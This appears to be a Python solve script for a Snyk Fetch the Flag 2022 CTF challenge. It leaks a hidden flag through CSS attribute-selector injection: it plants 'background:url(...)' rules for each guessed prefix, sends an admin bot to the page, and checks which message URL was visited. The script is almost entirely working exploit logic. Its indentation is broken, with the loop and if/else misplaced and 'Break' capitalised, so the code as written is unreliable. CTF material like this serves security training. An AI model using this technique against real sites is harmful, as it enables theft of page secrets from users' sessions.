```python
import time
import requests
import re
from urllib.parse import quote_plus
from string import digits

DOMAIN = "http://disposable-message.c.ctf-snyk.io"

def main():
      alphabet = "abcdef" + digits + "}"
      print("DOMAIN", DOMAIN)
      print("alphabet", alphabet)
      flag = "SNYK{"

      while True:
            payload = "?color=ffffff}"

            messages = {}
      for character in alphabet:
            guess = flag + character
            view_url, _ = generate_message()
            messages[guess] = view_url

            payload += generate_payload(view_url, guess)

      _, admin_url = generate_message()

      url = DOMAIN + admin_url + quote_plus(payload)
      requests.post(url)

      time.sleep(5)

      for guess, url in messages.items():
            status = requests.get(DOMAIN + url).status_code
            print(f"Checking '{guess}': {url} ({status})")

            if status == 404:
            flag = guess
            print("Found match", flag)
            Break
      else:
                  raise ValueError("Unable to find guess")

def generate_payload(url, guess):
      return f'div[data-flag^="{guess}"]{{background:url({url});}}'

def generate_message():
      data = {"message": "Hello world!"}
      resp = requests.post(DOMAIN + "/new", data=data)

      result = re.findall(r"/view/[a-f0-9\-]+", resp.text)
      view_url = result[0]

      result = re.findall(r"/admin-bot/[a-f0-9\-]+", resp.text)
      admin_url = result[0]

      return view_url, admin_url

if __name__ == "__main__":
      main()
```
https://snyk.io/blog/fetch-the-flag-ctf-2022-writeup-disposable-message/
